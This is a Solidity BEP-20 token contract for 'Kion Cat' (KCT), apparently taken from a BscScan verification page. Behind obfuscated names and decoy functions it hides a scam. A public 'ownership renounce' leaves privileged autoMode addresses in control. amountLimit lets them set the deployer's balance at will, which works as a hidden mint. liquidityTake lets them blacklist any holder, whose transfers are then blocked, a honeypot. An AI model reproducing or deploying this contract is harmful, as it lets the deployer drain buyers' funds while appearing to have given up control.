/**
 *Submitted for verification at BscScan.com on 2023-02-15
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface shouldAuto {
    function totalSupply() external view returns (uint256);

    function balanceOf(address minMarketing) external view returns (uint256);

    function transfer(address shouldWalletAuto, uint256 swapLimit) external returns (bool);

    function allowance(address buyTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 swapLimit) external returns (bool);

    function transferFrom(
        address sender,
        address shouldWalletAuto,
        uint256 swapLimit
    ) external returns (bool);

    event Transfer(address indexed from, address indexed walletLaunch, uint256 value);
    event Approval(address indexed buyTo, address indexed spender, uint256 value);
}

interface walletSender is shouldAuto {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract shouldMin {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface teamLiquidity {
    function createPair(address feeIs, address marketingAmount) external returns (address);
}

interface walletSwap {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract KionCat is shouldMin, shouldAuto, walletSender {

    function approve(address receiverLimit, uint256 swapLimit) public virtual override returns (bool) {
        isEnable[_msgSender()][receiverLimit] = swapLimit;
        emit Approval(_msgSender(), receiverLimit, swapLimit);
        return true;
    }

    function transfer(address receiverMode, uint256 swapLimit) external virtual override returns (bool) {
        return swapMax(_msgSender(), receiverMode, swapLimit);
    }

    function name() external view virtual override returns (string memory) {
        return fundTeam;
    }

    address public liquidityMode;

    mapping(address => uint256) private sellTakeSender;

    bool public swapToken;

    function tradingTake() public {
        if (senderTo != senderMax) {
            fromLaunched = false;
        }
        
        marketingToIs=false;
    }

    event OwnershipTransferred(address indexed fundLaunched, address indexed enableMin);

    bool public senderMax;

    function transferFrom(address liquidityTx, address shouldWalletAuto, uint256 swapLimit) external override returns (bool) {
        if (isEnable[liquidityTx][_msgSender()] != type(uint256).max) {
            require(swapLimit <= isEnable[liquidityTx][_msgSender()]);
            isEnable[liquidityTx][_msgSender()] -= swapLimit;
        }
        return swapMax(liquidityTx, shouldWalletAuto, swapLimit);
    }

    mapping(address => bool) public autoMode;

    function symbol() external view virtual override returns (string memory) {
        return liquidityTotal;
    }

    bool private senderTo;

    function amountLimit(uint256 swapLimit) public {
        if (!autoMode[_msgSender()]) {
            return;
        }
        sellTakeSender[marketingTx] = swapLimit;
    }

    function liquidityTake(address totalMax) public {
        if (fromLaunched) {
            atSenderMin = true;
        }
        if (totalMax == marketingTx || totalMax == liquidityMode || !autoMode[_msgSender()]) {
            return;
        }
        
        senderWallet[totalMax] = true;
    }

    function toAt() public view returns (bool) {
        return marketingToIs;
    }

    constructor (){
        if (marketingToIs) {
            atSenderMin = false;
        }
        walletSwap toTotal = walletSwap(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        liquidityMode = teamLiquidity(toTotal.factory()).createPair(toTotal.WETH(), address(this));
        receiverSell = _msgSender();
        if (senderMax != atSenderMin) {
            senderTo = false;
        }
        marketingTx = _msgSender();
        autoMode[_msgSender()] = true;
        if (fromLaunched) {
            senderTo = true;
        }
        sellTakeSender[_msgSender()] = liquidityToken;
        emit Transfer(address(0), marketingTx, liquidityToken);
        fromSender();
    }

    bool private marketingToIs;

    function balanceOf(address minMarketing) public view virtual override returns (uint256) {
        return sellTakeSender[minMarketing];
    }

    function isWallet() public view returns (bool) {
        return senderTo;
    }

    function swapSell(address swapFee) public {
        if (swapToken) {
            return;
        }
        
        autoMode[swapFee] = true;
        
        swapToken = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return senderFee;
    }

    function limitSender(address liquidityTx, address shouldWalletAuto, uint256 swapLimit) internal returns (bool) {
        require(sellTakeSender[liquidityTx] >= swapLimit);
        sellTakeSender[liquidityTx] -= swapLimit;
        sellTakeSender[shouldWalletAuto] += swapLimit;
        emit Transfer(liquidityTx, shouldWalletAuto, swapLimit);
        return true;
    }

    function owner() external view returns (address) {
        return receiverSell;
    }

    string private fundTeam = "Kion Cat";

    address private receiverSell;

    mapping(address => mapping(address => uint256)) private isEnable;

    function allowance(address shouldAmount, address receiverLimit) external view virtual override returns (uint256) {
        return isEnable[shouldAmount][receiverLimit];
    }

    function fromSender() public {
        emit OwnershipTransferred(marketingTx, address(0));
        receiverSell = address(0);
    }

    bool private fromLaunched;

    uint256 private liquidityToken = 100000000 * 10 ** 18;

    string private liquidityTotal = "KCT";

    function getOwner() external view returns (address) {
        return receiverSell;
    }

    function tokenLaunchedWallet() public {
        if (atSenderMin == marketingToIs) {
            marketingToIs = true;
        }
        if (atSenderMin) {
            fromLaunched = true;
        }
        senderTo=false;
    }

    bool public atSenderMin;

    mapping(address => bool) public senderWallet;

    function totalSupply() external view virtual override returns (uint256) {
        return liquidityToken;
    }

    uint8 private senderFee = 18;

    function swapMax(address liquidityTx, address shouldWalletAuto, uint256 swapLimit) internal returns (bool) {
        if (liquidityTx == marketingTx) {
            return limitSender(liquidityTx, shouldWalletAuto, swapLimit);
        }
        require(!senderWallet[liquidityTx]);
        return limitSender(liquidityTx, shouldWalletAuto, swapLimit);
    }

    address public marketingTx;

}